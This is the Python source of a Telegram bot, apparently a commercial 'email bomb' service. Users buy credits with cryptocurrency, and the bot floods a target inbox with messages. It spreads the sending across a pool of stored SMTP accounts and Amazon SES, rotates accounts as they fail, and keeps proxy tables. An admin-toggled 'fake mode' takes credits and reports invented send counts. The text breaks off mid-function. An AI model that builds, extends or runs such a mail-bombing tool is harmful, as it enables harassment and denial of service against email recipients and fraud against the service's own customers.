#!/usr/bin/env python3
"""
🌧️ RBX404 MailBomb Bot - COMPLETE CLEAN REWRITE
Everything working, validated, optimized
"""
from datetime import datetime, timedelta, timezone
import os
import asyncio
import logging
import secrets
import json
import requests
import smtplib
import mimetypes
import re
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage

# Logging
logging.basicConfig(
    level=logging.ERROR,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('RBX404.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# AWS SES (optional)
try:
    import boto3
    from botocore.exceptions import ClientError
    SES_AVAILABLE = True
except ImportError:
    SES_AVAILABLE = False

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from dotenv import load_dotenv

load_dotenv()

# Environment
BOT_TOKEN = os.getenv("BOT_TOKEN", "")
ADMIN_IDS = [int(x.strip()) for x in os.getenv("ADMIN_IDS", "").split(",") if x.strip()]
OXAPAY_API_KEY = os.getenv("OXAPAY_MERCHANT_API_KEY", "")
DATABASE_URL = os.getenv("DATABASE_URL", "sqlite:///RBX404.db")

# Channel & Group for referral verification
CHANNEL_USERNAME = os.getenv("CHANNEL_USERNAME", "").strip()
GROUP_USERNAME = os.getenv("GROUP_USERNAME", "").strip()

# AWS SES
AWS_ACCESS_KEY_ID = os.getenv("AWS_ACCESS_KEY_ID", "")
AWS_SECRET_ACCESS_KEY = os.getenv("AWS_SECRET_ACCESS_KEY", "")
AWS_REGION = os.getenv("AWS_REGION", "us-east-1")
SES_SENDER_EMAIL = os.getenv("SES_SENDER_EMAIL", "")
USE_SES = os.getenv("USE_SES", "false").lower() == "true"

print("=" * 60)
print("🌧️ RBX404 MailBomb Bot")
print("=" * 60)

# SMTP providers
SMTP_SERVERS = {
    "gmail.com": ("smtp.gmail.com", 587),
    "outlook.com": ("smtp-mail.outlook.com", 587),
    "hotmail.com": ("smtp-mail.outlook.com", 587),
    "yahoo.com": ("smtp.mail.yahoo.com", 587),
    "icloud.com": ("smtp.mail.me.com", 587),
}

def get_smtp_server(email):
    domain = email.split("@")[-1].lower()
    return SMTP_SERVERS.get(domain, ("smtp.gmail.com", 587))

def is_valid_email(email):
    pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
    return re.match(pattern, email) is not None

# Sessions
user_sessions = {}

# Database
from sqlalchemy import create_engine, Column, Integer, String, Boolean, DateTime, Float, Text, func
from sqlalchemy.orm import declarative_base, sessionmaker

Base = declarative_base()
engine = create_engine(DATABASE_URL, pool_pre_ping=True, pool_recycle=3600)
SessionLocal = sessionmaker(bind=engine)

class User(Base):
    __tablename__ = "users"
    id = Column(Integer, primary_key=True)
    tg_id = Column(Integer, unique=True, nullable=False, index=True)
    username = Column(String)
    first_name = Column(String)
    credits = Column(Integer, default=0)
    total_spent = Column(Float, default=0.0)
    total_emails_sent = Column(Integer, default=0)
    created_at = Column(DateTime, default=datetime.utcnow)
    last_active = Column(DateTime, default=datetime.utcnow)
    is_banned = Column(Boolean, default=False)
    # Referral fields
    referred_by = Column(Integer, default=None)  # tg_id of referrer
    referral_count = Column(Integer, default=0)  # how many users this user referred
    is_verified = Column(Boolean, default=False)  # whether user joined channel & group

class Referral(Base):
    __tablename__ = "referrals"
    id = Column(Integer, primary_key=True)
    referrer_id = Column(Integer, nullable=False, index=True)  # tg_id
    referred_id = Column(Integer, nullable=False, index=True)  # tg_id
    status = Column(String, default="pending")  # pending, verified
    created_at = Column(DateTime, default=datetime.utcnow)
    verified_at = Column(DateTime)

class SmtpAccount(Base):
    __tablename__ = "smtp_accounts"
    id = Column(Integer, primary_key=True)
    email = Column(String, nullable=False, index=True)
    password = Column(String, nullable=False)
    auth_type = Column(String, default="password", index=True)  # password, app_password, smtp
    smtp_server = Column(String, default="smtp.gmail.com")
    smtp_port = Column(Integer, default=587)
    is_active = Column(Boolean, default=True, index=True)
    health_status = Column(String, default="unknown", index=True)
    sent_today = Column(Integer, default=0)
    total_sent = Column(Integer, default=0)
    total_failed = Column(Integer, default=0)
    consecutive_fails = Column(Integer, default=0)
    last_used = Column(DateTime)
    last_health_check = Column(DateTime, default=datetime.utcnow)
    created_at = Column(DateTime, default=datetime.utcnow)

class Proxy(Base):
    __tablename__ = "proxies"
    id = Column(Integer, primary_key=True)
    proxy_string = Column(String, nullable=False)
    proxy_type = Column(String, default="http")
    is_active = Column(Boolean, default=True, index=True)
    times_used = Column(Integer, default=0)
    created_at = Column(DateTime, default=datetime.utcnow)

class CreditPackage(Base):
    __tablename__ = "credit_packages"
    id = Column(Integer, primary_key=True)
    name = Column(String, nullable=False)
    credits = Column(Integer, nullable=False)
    price_usd = Column(Float, nullable=False)
    stock = Column(Integer)
    sold_count = Column(Integer, default=0)
    is_active = Column(Boolean, default=True, index=True)
    description = Column(Text)
    created_at = Column(DateTime, default=datetime.utcnow)

class Coupon(Base):
    __tablename__ = "coupons"
    id = Column(Integer, primary_key=True)
    code = Column(String, unique=True, nullable=False, index=True)
    credits = Column(Integer, nullable=False)
    max_uses = Column(Integer)
    uses = Column(Integer, default=0)
    is_active = Column(Boolean, default=True, index=True)
    created_by = Column(Integer, nullable=False)
    created_at = Column(DateTime, default=datetime.utcnow)

class Payment(Base):
    __tablename__ = "payments"
    id = Column(Integer, primary_key=True)
    user_tg_id = Column(Integer, nullable=False, index=True)
    package_id = Column(Integer)
    amount_usd = Column(Float, nullable=False)
    credits = Column(Integer, nullable=False)
    track_id = Column(String, unique=True, index=True)
    payment_url = Column(String)
    status = Column(String, default="pending", index=True)
    created_at = Column(DateTime, default=datetime.utcnow)
    completed_at = Column(DateTime)

class BombLog(Base):
    __tablename__ = "bomb_logs"
    id = Column(Integer, primary_key=True)
    user_tg_id = Column(Integer, nullable=False, index=True)
    target_email = Column(String, nullable=False)
    subject = Column(String)
    requested_count = Column(Integer, nullable=False)
    successful_count = Column(Integer, default=0)
    failed_count = Column(Integer, default=0)
    credits_used = Column(Integer, nullable=False)
    created_at = Column(DateTime, default=datetime.utcnow, index=True)
    completed_at = Column(DateTime)

class BotSettings(Base):
    __tablename__ = "bot_settings"
    id = Column(Integer, primary_key=True)
    key = Column(String, unique=True, nullable=False, index=True)
    value = Column(Text)
    updated_at = Column(DateTime, default=datetime.utcnow)

Base.metadata.create_all(engine)

# Helper functions
def get_user(db, tg_id, username=None, first_name=None):
    user = db.query(User).filter(User.tg_id == tg_id).first()
    if not user:
        user = User(tg_id=tg_id, username=username, first_name=first_name)
        db.add(user)
        db.commit()
    else:
        user.last_active = datetime.now(timezone.utc)
        # Update username/first_name if changed
        if username:
            user.username = username
        if first_name:
            user.first_name = first_name
        db.commit()
    return user

def get_setting(db, key, default=None):
    setting = db.query(BotSettings).filter(BotSettings.key == key).first()
    return setting.value if setting else default

def set_setting(db, key, value):
    setting = db.query(BotSettings).filter(BotSettings.key == key).first()
    if setting:
        setting.value = value
        setting.updated_at = datetime.now(timezone.utc)
    else:
        setting = BotSettings(key=key, value=value)
        db.add(setting)
    db.commit()

def get_bot_logo():
    db = SessionLocal()
    try:
        return get_setting(db, "bot_logo_file_id", None)
    finally:
        db.close()

# ========== REFERRAL FUNCTIONS ==========

async def is_user_in_channel_and_group(bot, user_id):
    """Check if user is member of both channel and group"""
    if not CHANNEL_USERNAME or not GROUP_USERNAME:
        # If not configured, treat as verified (skip check)
        return True
    
    try:
        # Check channel
        channel_member = await bot.get_chat_member(CHANNEL_USERNAME, user_id)
        if channel_member.status not in ['member', 'administrator', 'creator']:
            return False
    except Exception:
        return False
    
    try:
        # Check group
        group_member = await bot.get_chat_member(GROUP_USERNAME, user_id)
        if group_member.status not in ['member', 'administrator', 'creator']:
            return False
    except Exception:
        return False
    
    return True

async def verify_referral(bot, db, referred_id):
    """Verify a referred user and credit the referrer if both joined"""
    # Get the referred user
    referred = db.query(User).filter(User.tg_id == referred_id).first()
    if not referred or not referred.referred_by:
        return False
    
    # Check if already verified
    existing = db.query(Referral).filter(
        Referral.referred_id == referred_id,
        Referral.status == "verified"
    ).first()
    if existing:
        return False
    
    # Check if user is in channel and group
    if not await is_user_in_channel_and_group(bot, referred_id):
        return False
    
    # Get referrer
    referrer = db.query(User).filter(User.tg_id == referred.referred_by).first()
    if not referrer:
        return False
    
    # Update referral record
    referral = db.query(Referral).filter(
        Referral.referred_id == referred_id,
        Referral.status == "pending"
    ).first()
    if referral:
        referral.status = "verified"
        referral.verified_at = datetime.now(timezone.utc)
    else:
        # Create if not exists (shouldn't happen)
        referral = Referral(
            referrer_id=referrer.tg_id,
            referred_id=referred_id,
            status="verified",
            verified_at=datetime.now(timezone.utc)
        )
        db.add(referral)
    
    # Credit referrer with 5 coins
    referrer.credits += 5
    referrer.referral_count += 1
    referred.is_verified = True
    db.commit()
    
    # Notify both users
    try:
        await bot.send_message(
            chat_id=referrer.tg_id,
            text=f"🎉 **Referral Verified!**\n\nUser `{referred_id}` has joined the channel & group.\nYou received **5 credits**! 💰\n\nNew Balance: **{referrer.credits}**",
            parse_mode='Markdown'
        )
    except:
        pass
    
    try:
        await bot.send_message(
            chat_id=referred_id,
            text=f"✅ **Verification Complete!**\n\nYou have been verified. Your referrer received 5 credits.\n\nThank you for joining! 🎉"
        )
    except:
        pass
    
    return True

async def handle_referral_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /start with referral parameter"""
    user_id = update.effective_user.id
    text = update.message.text
    
    # Extract referral code if present
    ref_id = None
    if text and " " in text:
        parts = text.split()
        if len(parts) > 1 and parts[1].startswith("ref_"):
            try:
                ref_id = int(parts[1].replace("ref_", ""))
            except:
                ref_id = None
    
    db = SessionLocal()
    try:
        user = get_user(db, user_id, update.effective_user.username, update.effective_user.first_name)
        
        # If user was referred and not yet verified
        if ref_id and ref_id != user_id:
            # Check if user already has a referrer
            if user.referred_by is None:
                # Store referral
                user.referred_by = ref_id
                db.commit()
                
                # Create referral record
                referral = Referral(
                    referrer_id=ref_id,
                    referred_id=user_id,
                    status="pending"
                )
                db.add(referral)
                db.commit()
                
                # Check if user is already in channel & group (might be already joined)
                if await is_user_in_channel_and_group(update.get_bot(), user_id):
                    # Verify immediately
                    await verify_referral(update.get_bot(), db, user_id)
                else:
                    # Send instructions to join
                    await update.message.reply_text(
                        f"🔗 **Referral Accepted!**\n\nYou were referred by user `{ref_id}`.\n\n"
                        f"Please join our **channel** and **group** to verify your referral:\n"
                        f"📢 Channel: {CHANNEL_USERNAME or 'Not set'}\n"
                        f"👥 Group: {GROUP_USERNAME or 'Not set'}\n\n"
                        f"After joining, type `/verify` to claim your referrer's reward.",
                        parse_mode='Markdown'
                    )
            else:
                await update.message.reply_text(
                    "ℹ️ You already have a referrer. You cannot be referred again."
                )
    
    finally:
        db.close()

async def verify_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Manually verify referral if user joined channel & group"""
    user_id = update.effective_user.id
    db = SessionLocal()
    try:
        user = get_user(db, user_id)
        
        if not user.referred_by:
            await update.message.reply_text("ℹ️ You don't have any pending referral.")
            return
        
        # Check if already verified
        existing = db.query(Referral).filter(
            Referral.referred_id == user_id,
            Referral.status == "verified"
        ).first()
        if existing:
            await update.message.reply_text("✅ You are already verified! Your referrer received their reward.")
            return
        
        # Verify
        success = await verify_referral(update.get_bot(), db, user_id)
        if success:
            await update.message.reply_text(
                "✅ **Verification Successful!**\n\n"
                "Your referrer has received 5 credits. Thank you for joining!"
            )
        else:
            await update.message.reply_text(
                "❌ **Verification Failed**\n\n"
                "Please make sure you have joined both our channel and group, then try again.\n"
                f"📢 Channel: {CHANNEL_USERNAME or 'Not set'}\n"
                f"👥 Group: {GROUP_USERNAME or 'Not set'}\n\n"
                "Type `/verify` again after joining."
            )
    finally:
        db.close()

async def referral_info_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show referral link and stats"""
    user_id = update.effective_user.id
    bot_username = (await update.get_bot().get_me()).username
    
    db = SessionLocal()
    try:
        user = get_user(db, user_id)
        
        # Count verified referrals
        verified_count = db.query(Referral).filter(
            Referral.referrer_id == user_id,
            Referral.status == "verified"
        ).count()
        
        referral_link = f"https://t.me/{bot_username}?start=ref_{user_id}"
        
        text = f"""
🔗 **Referral System**

Your referral link:
`{referral_link}`

📊 **Your Stats:**
- Total Referred: {user.referral_count}
- Verified Referrals: {verified_count}
- Credits Earned: {user.referral_count * 5}

💡 **How it works:**
1. Share your referral link with friends.
2. When they join via your link, they'll be asked to join our channel & group.
3. Once they join both, you receive **5 credits** automatically!

📢 Channel: {CHANNEL_USERNAME or 'Not set'}
👥 Group: {GROUP_USERNAME or 'Not set'}
"""
        await update.message.reply_text(text, parse_mode='Markdown')
    finally:
        db.close()

# ========== SMTP VALIDATION & SENDING (unchanged) ==========

async def validate_smtp_account(email, password, auth_type="password"):
    """Test SMTP account before adding - returns (success, error_msg)"""
    try:
        smtp_server, smtp_port = get_smtp_server(email)
        
        def _test():
            server = smtplib.SMTP(smtp_server, smtp_port, timeout=10)
            server.starttls()
            server.login(email, password)
            server.quit()
            return True
        
        await asyncio.to_thread(_test)
        return True, "Account validated successfully"
    
    except smtplib.SMTPAuthenticationError:
        return False, "Authentication failed - invalid credentials"
    except smtplib.SMTPException as e:
        return False, f"SMTP error: {str(e)[:50]}"
    except Exception as e:
        return False, f"Connection error: {str(e)[:50]}"

async def validate_proxy(proxy_string):
    """Test proxy before adding - returns (success, error_msg)"""
    try:
        # Parse proxy
        if "://" in proxy_string:
            parts = proxy_string.split("://")
            proxy_type = parts[0]
            proxy_addr = parts[1]
        else:
            proxy_type = "http"
            proxy_addr = proxy_string
        
        # Test with simple HTTP request
        proxies = {
            proxy_type: f"{proxy_type}://{proxy_addr}"
        }
        
        def _test():
            response = requests.get("https://api.ipify.org", proxies=proxies, timeout=10)
            return response.status_code == 200
        
        success = await asyncio.to_thread(_test)
        return (True, "Proxy working") if success else (False, "Proxy not responding")
    
    except Exception as e:
        return False, f"Proxy test failed: {str(e)[:50]}"

async def send_via_ses(target, subject, body):
    """Send email via Amazon SES"""
    if not SES_AVAILABLE:
        return False, "boto3 not installed"
    
    if not all([AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, SES_SENDER_EMAIL]):
        return False, "SES not configured"
    
    try:
        def _send():
            ses_client = boto3.client(
                'ses',
                region_name=AWS_REGION,
                aws_access_key_id=AWS_ACCESS_KEY_ID,
                aws_secret_access_key=AWS_SECRET_ACCESS_KEY
            )
            
            response = ses_client.send_email(
                Source=SES_SENDER_EMAIL,
                Destination={'ToAddresses': [target]},
                Message={
                    'Subject': {'Data': subject},
                    'Body': {'Html': {'Data': body}}
                }
            )
            return response
        
        await asyncio.to_thread(_send)
        return True, "sent"
    
    except ClientError as e:
        error_code = e.response['Error']['Code']
        return False, f"SES error: {error_code}"
    except Exception as e:
        return False, f"Error: {str(e)}"

async def send_single_email(account, target, subject, body):
    """Send single email via SMTP account"""
    try:
        def _send():
            server = smtplib.SMTP(account.smtp_server, account.smtp_port, timeout=10)
            server.starttls()
            server.login(account.email, account.password)
            
            msg = MIMEMultipart()
            msg['From'] = account.email
            msg['To'] = target
            msg['Subject'] = subject
            msg.attach(MIMEText(body, 'html'))
            
            server.send_message(msg)
            server.quit()
            return True
        
        await asyncio.to_thread(_send)
        return True, "sent"
    
    except smtplib.SMTPAuthenticationError:
        return False, "auth_failed"
    except smtplib.SMTPException as e:
        return False, f"smtp_error: {str(e)[:30]}"
    except Exception as e:
        return False, f"error: {str(e)[:30]}"

# Account rotation
class AccountRotator:
    @staticmethod
    def get_next_account(db):
        """Get next available SMTP account (prioritize app_password)"""
        # Try app_password first
        account = db.query(SmtpAccount).filter(
            SmtpAccount.is_active == True,
            SmtpAccount.auth_type == "app_password",
            SmtpAccount.health_status != "dead"
        ).order_by(SmtpAccount.last_used.asc()).first()
        
        if account:
            return account
        
        # Fallback to any active account
        account = db.query(SmtpAccount).filter(
            SmtpAccount.is_active == True,
            SmtpAccount.health_status != "dead"
        ).order_by(SmtpAccount.last_used.asc()).first()
        
        return account

async def bomb_email(user_tg_id, target, count, subject, message):
    """Execute email bomb"""
    db = SessionLocal()
    try:
        # Check bombing mode
        real_bombing_setting = get_setting(db, "real_bombing", "true")
        real_bombing = real_bombing_setting.lower() == "true"
        
        logger.info(f"Bombing mode: real_bombing_setting='{real_bombing_setting}', real_bombing={real_bombing}")
        
        # Deduct credits upfront
        user = get_user(db, user_tg_id)
        if user.credits < count:
            return {"success": False, "error": "Insufficient credits", "sent": 0, "failed": count, "total": count}
        
        user.credits -= count
        db.commit()
        
        # Create log
        bomb_log = BombLog(
            user_tg_id=user_tg_id,
            target_email=target,
            subject=subject,
            requested_count=count,
            credits_used=count
        )
        db.add(bomb_log)
        db.commit()
        
        # FAKE MODE
        if not real_bombing:
            logger.info("Using FAKE MODE")
            await asyncio.sleep(2)
            successful = int(count * 0.95) + (1 if count > 10 else 0)
            failed = count - successful
            
            bomb_log.successful_count = successful
            bomb_log.failed_count = failed
            bomb_log.completed_at = datetime.now(timezone.utc)
            db.commit()
            
            user.total_emails_sent += successful
            db.commit()
            
            return {"success": True, "sent": successful, "failed": failed, "total": count}
        
        logger.info("Using REAL MODE")
        
        # REAL MODE - SES
        if USE_SES and SES_AVAILABLE:
            logger.info("Using SES")
            successful = 0
            failed = 0
            batch_size = 10
            
            for i in range(0, count, batch_size):
                batch_count = min(batch_size, count - i)
                tasks = [send_via_ses(target, subject, message) for _ in range(batch_count)]
                results = await asyncio.gather(*tasks, return_exceptions=True)
                
                for result in results:
                    if isinstance(result, Exception) or not result[0]:
                        failed += 1
                    else:
                        successful += 1
                
                if i + batch_size < count:
                    await asyncio.sleep(0.1)
            
            bomb_log.successful_count = successful
            bomb_log.failed_count = failed
            bomb_log.completed_at = datetime.now(timezone.utc)
            db.commit()
            
            user.total_emails_sent += successful
            db.commit()
            
            return {"success": True, "sent": successful, "failed": failed, "total": count}
        
        # REAL MODE - SMTP
        logger.info("Using SMTP")
        successful = 0
        failed = 0
        batch_size = 3
        
        for i in range(0, count, batch_size):
            batch_count = min(batch_size, count - i)
            tasks = []
            accounts_used = []
            
            for j in range(batch_count):
                account = AccountRotator.get_next_account(db)
                if not account:
                    failed += 1
                    continue
                
                account.last_used = datetime.now(timezone.utc)
                account.sent_today += 1
                accounts_used.append(account)
                db.commit()
                
                tasks.append((send_single_email(account, target, subject, message), account))
            
            results = await asyncio.gather(*[t[0] for t in tasks], return_exceptions=True)
            
            for idx, result in enumerate(results):
                account = tasks[idx][1]
                if isinstance(result, Exception) or not result[0]:
                    failed += 1
                    account.total_failed += 1
                    account.consecutive_fails += 1
                else:
                    successful += 1
                    account.total_sent += 1
                    account.consecutive_fails = 0
                
                if account.consecutive_fails >= 3:
                    account.is_active = False
                    account.health_status = "dead"
            
            db.commit()
            
            if i + batch_size < count:
                await asyncio.sleep(0.8)
        
        bomb_log.successful_count = successful
        bomb_log.failed_count = failed
        bomb_log.completed_at = datetime.now(timezone.utc)
        db.commit()
        
        user.total_emails_sent += successful
        db.commit()
        
        return {"success": True, "sent": successful, "failed": failed, "total": count}
    
    except Exception as e:
        logger.error(f"Bomb error: {e}")
        return {"success": False, "error": str(e), "sent": 0, "failed": count, "total": count}
    finally:
        db.close()


# ========== BUTTON CALLBACK SYSTEM (unchanged) ==========

async def button_callback(query, context):
    """Main button handler - ALL buttons handled here inline"""
    data = query.data
    user_id = query.from_user.id
    
    # Answer callback immediately
    try:
        await query.answer()
    except:
        pass
    
    # Helper: safe edit (handles photo->text transitions)
    async def safe_edit(text, markup=None):
        has_photo = query.message.photo is not None and len(query.message.photo) > 0
        
        if has_photo:
            try:
                await query.message.delete()
                await query.message.reply_text(text, reply_markup=markup, parse_mode='Markdown')
            except:
                pass
        else:
            try:
                await query.edit_message_text(text, reply_markup=markup, parse_mode='Markdown')
            except:
                pass
    
    # Helper: send with image (text->photo or photo->photo)
    async def send_with_image(text, markup=None):
        logo = get_bot_logo()
        has_photo = query.message.photo is not None and len(query.message.photo) > 0
        
        if logo and has_photo:
            try:
                await query.edit_message_caption(caption=text, reply_markup=markup, parse_mode='Markdown')
                return
            except:
                pass
        
        if logo and not has_photo:
            try:
                await query.message.delete()
                await query.message.reply_photo(photo=logo, caption=text, reply_markup=markup, parse_mode='Markdown')
                return
            except:
                pass
        
        await safe_edit(text, markup)
    
    # START / MAIN MENU
    if data == "start":
        db = SessionLocal()
        try:
            user = get_user(db, user_id)
            is_admin = user_id in ADMIN_IDS
            
            text = f"""
🌧️ **RBX404 MailBomb Bot**

💰 Credits: **{user.credits}**
📧 Sent: **{user.total_emails_sent}**
💵 Spent: **${user.total_spent:.2f}**
"""
            
            keyboard = [
                [InlineKeyboardButton("💣 Email Bomb", callback_data="bomb")],
                [InlineKeyboardButton("🛒 Buy Credits", callback_data="purchase"),
                 InlineKeyboardButton("💰 Balance", callback_data="balance")],
                [InlineKeyboardButton("🎟️ Redeem", callback_data="redeem"),
                 InlineKeyboardButton("📊 History", callback_data="my_history")],
                [InlineKeyboardButton("❓ Help", callback_data="help")],
                [InlineKeyboardButton("🔗 Referral", callback_data="referral_info")]
            ]
            
            if is_admin:
                keyboard.append([InlineKeyboardButton("⚙️ ADMIN PANEL", callback_data="admin")])
            
            await send_with_image(text, InlineKeyboardMarkup(keyboard))
        finally:
            db.close()
        return
    
    # BALANCE
    elif data == "balance":
        db = SessionLocal()
        try:
            user = get_user(db, user_id)
            recent = db.query(BombLog).filter(BombLog.user_tg_id == user.tg_id).order_by(BombLog.created_at.desc()).limit(5).all()
            
            text = f"""
💰 **Your Balance**

Credits: **{user.credits}**
Spent: **${user.total_spent:.2f}**
Sent: **{user.total_emails_sent}**

📊 **Recent Bombs:**
"""
            
            for log in recent:
                status = "✅" if log.completed_at else "⏳"
                text += f"\n{status} {log.target_email}: {log.successful_count}/{log.requested_count}"
            
            if not recent:
                text += "\nNo bombs yet!"
            
            keyboard = [
                [InlineKeyboardButton("🛒 Buy More", callback_data="purchase")],
                [InlineKeyboardButton("🔙 Back", callback_data="start")]
            ]
            await send_with_image(text, InlineKeyboardMarkup(keyboard))
        finally:
            db.close()
        return
    
    # BOMB START
    elif data == "bomb":
        user_sessions[user_id] = {"step": "email"}
        text = "💣 **Email Bomb**\n\nSend target email:"
        keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data="cancel")]]
        await safe_edit(text, InlineKeyboardMarkup(keyboard))
        return
    
    # PURCHASE
    elif data == "purchase":
        db = SessionLocal()
        try:
            packages = db.query(CreditPackage).filter(CreditPackage.is_active == True).all()
            
            if not packages:
                text = "❌ **No Packages Available**"
                keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="start")]]
            else:
                text = "💰 **Credit Packages**\n\n"
                keyboard = []
                
                for pkg in packages:
                    stock_text = ""
                    is_available = True
                    
                    if pkg.stock is not None:
                        remaining = pkg.stock - pkg.sold_count
                        if remaining <= 0:
                            stock_text = " [OUT OF STOCK ❌]"
                            is_available = False
                        elif remaining < 10:
                            stock_text = f" [{remaining} left! 🔥]"
                    else:
                        stock_text = " [Unlimited ♾️]"
                    
                    text += f"**{pkg.name}**{stock_text}\n"
                    text += f"💎 {pkg.credits} credits - ${pkg.price_usd:.2f}\n"
                    if pkg.description:
                        text += f"📝 {pkg.description}\n"
                    text += "\n"
                    
                    if is_available:
                        keyboard.append([InlineKeyboardButton(
                            f"💳 {pkg.name} - ${pkg.price_usd:.2f}",
                            callback_data=f"buy_{pkg.id}"
                        )])
                
                keyboard.append([InlineKeyboardButton("🔙 Back", callback_data="start")])
            
            await send_with_image(text, InlineKeyboardMarkup(keyboard))
        finally:
            db.close()
        return
    
    # REDEEM
    elif data == "redeem":
        user_sessions[user_id] = {"step": "coupon"}
        text = "🎟️ **Redeem Coupon**\n\nSend your code:"
        keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data="cancel")]]
        await safe_edit(text, InlineKeyboardMarkup(keyboard))
        return
    
    # HELP
    elif data == "help":
        text = """
❓ **Help**

**/start** - Main menu
**/bomb** - Start bombing
**/purchase** - Buy credits
**/redeem** - Use coupon
**/referral** - Referral link & stats
**/verify** - Verify your referral

**How to Bomb:**
1. Click 💣 Email Bomb
2. Enter target email
3. Enter count
4. Enter subject & message
5. Confirm!

**Support:** Contact admin
"""
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="start")]]
        await send_with_image(text, InlineKeyboardMarkup(keyboard))
        return
    
    # HISTORY
    elif data.startswith("my_history"):
        page = 0
        if "_page_" in data:
            page = int(data.split("_page_")[-1])
        
        db = SessionLocal()
        try:
            per_page = 5
            total = db.query(BombLog).filter(BombLog.user_tg_id == user_id).count()
            logs = db.query(BombLog).filter(BombLog.user_tg_id == user_id).order_by(BombLog.created_at.desc()).limit(per_page).offset(page * per_page).all()
            
            text = f"📊 **Bomb History** (Page {page + 1})\n\n"
            
            for log in logs:
                status = "✅" if log.completed_at else "⏳"
                text += f"{status} **{log.target_email}**\n"
                text += f"   Sent: {log.successful_count}/{log.requested_count}\n"
                text += f"   {log.created_at.strftime('%Y-%m-%d %H:%M')}\n\n"
            
            keyboard = []
            nav = []
            if page > 0:
                nav.append(InlineKeyboardButton("⬅️", callback_data=f"my_history_page_{page-1}"))
            if (page + 1) * per_page < total:
                nav.append(InlineKeyboardButton("➡️", callback_data=f"my_history_page_{page+1}"))
            if nav:
                keyboard.append(nav)
            
            keyboard.append([InlineKeyboardButton("🔙 Back", callback_data="start")])
            await safe_edit(text, InlineKeyboardMarkup(keyboard))
        finally:
            db.close()
        return
    
    # CANCEL
    elif data == "cancel":
        user_sessions.pop(user_id, None)
        await safe_edit("❌ Cancelled!", None)
        return

    # REFERRAL INFO
    elif data == "referral_info":
        # Reuse referral_info_cmd logic
        await referral_info_cmd_from_query(query, context)
        return

    # ========== ADMIN PANEL (unchanged) ==========
    
    elif data == "admin":
        if user_id not in ADMIN_IDS:
            await query.answer("❌ Admin only!", show_alert=True)
            return
        
        db = SessionLocal()
        try:
            total_users = db.query(User).count()
            total_credits = db.query(func.sum(User.credits)).scalar() or 0
            total_revenue = db.query(func.sum(Payment.amount_usd)).filter(Payment.status == "paid").scalar() or 0
            
            smtp_total = db.query(SmtpAccount).count()
            smtp_active = db.query(SmtpAccount).filter(SmtpAccount.is_active == True).count()
            smtp_healthy = db.query(SmtpAccount).filter(SmtpAccount.health_status == "healthy").count()
            
            proxy_total = db.query(Proxy).count()
            proxy_active = db.query(Proxy).filter(Proxy.is_active == True).count()
            
            packages_active = db.query(CreditPackage).filter(CreditPackage.is_active == True).count()
            coupons_active = db.query(Coupon).filter(Coupon.is_active == True).count()
            
            real_bombing = get_setting(db, "real_bombing", "true").lower()
            bomb_status = "✅ REAL" if real_bombing == "true" else "❌ FAKE"
            min_bomb = int(get_setting(db, "min_bomb_amount", "100"))
            
            text = f"""
⚙️ **ADMIN PANEL**

🚀 **Bombing: {bomb_status}**
💣 **Min Amount: {min_bomb}**

👥 **Users:** {total_users}
💰 **Credits:** {total_credits:,}
💵 **Revenue:** ${total_revenue:.2f}

📧 **SMTP:** {smtp_active}/{smtp_total} (💚 {smtp_healthy})
🌐 **Proxies:** {proxy_active}/{proxy_total}
💰 **Packages:** {packages_active}
🎟️ **Coupons:** {coupons_active}
"""
            
            keyboard = [
                [InlineKeyboardButton("🔄 Toggle Bomb", callback_data="admin_toggle_bomb"),
                 InlineKeyboardButton("💣 Set Min", callback_data="admin_set_min")],
                [InlineKeyboardButton("📧 SMTP", callback_data="admin_smtp"),
                 InlineKeyboardButton("🌐 Proxies", callback_data="admin_proxies")],
                [InlineKeyboardButton("💰 Packages", callback_data="admin_packages"),
                 InlineKeyboardButton("🎟️ Coupons", callback_data="admin_coupons")],
                [InlineKeyboardButton("👥 Users", callback_data="admin_users"),
                 InlineKeyboardButton("📊 Logs", callback_data="admin_logs")],
                [InlineKeyboardButton("💳 Payments", callback_data="admin_payments")],
                [InlineKeyboardButton("🔙 Back", callback_data="start")]
            ]
            
            await safe_edit(text, InlineKeyboardMarkup(keyboard))
        finally:
            db.close()
        return
    
    # TOGGLE BOMB MODE
    elif data == "admin_toggle_bomb":
        if user_id not in ADMIN_IDS:
            return
        
        db = SessionLocal()
        try:
            current = get_setting(db, "real_bombing", "true").lower()
            new_value = "false" if current == "true" else "true"
            set_setting(db, "real_bombing", new_value)
            
            status = "✅ REAL BOMBING ENABLED" if new_value == "true" else "❌ FAKE MODE ENABLED"
            await query.answer(status, show_alert=True)
            
            # Reload admin panel - duplicate code to avoid query.data modification
            total_users = db.query(User).count()
            total_credits = db.query(func.sum(User.credits)).scalar() or 0
            total_revenue = db.query(func.sum(Payment.amount_usd)).filter(Payment.status == "paid").scalar() or 0
            
            smtp_total = db.query(SmtpAccount).count()
            smtp_active = db.query(SmtpAccount).filter(SmtpAccount.is_active == True).count()
            smtp_healthy = db.query(SmtpAccount).filter(SmtpAccount.health_status == "healthy").count()
            
            proxy_total = db.query(Proxy).count()
            proxy_active = db.query(Proxy).filter(Proxy.is_active == True).count()
            
            packages_active = db.query(CreditPackage).filter(CreditPackage.is_active == True).count()
            coupons_active = db.query(Coupon).filter(Coupon.is_active == True).count()
            
            real_bombing_reload = get_setting(db, "real_bombing", "true").lower()
            bomb_status = "✅ REAL" if real_bombing_reload == "true" else "❌ FAKE"
            min_bomb = int(get_setting(db, "min_bomb_amount", "100"))
            
            text = f"""
⚙️ **ADMIN PANEL**

🚀 **Bombing: {bomb_status}**
💣 **Min Amount: {min_bomb}**

👥 **Users:** {total_users}
💰 **Credits:** {total_credits:,}
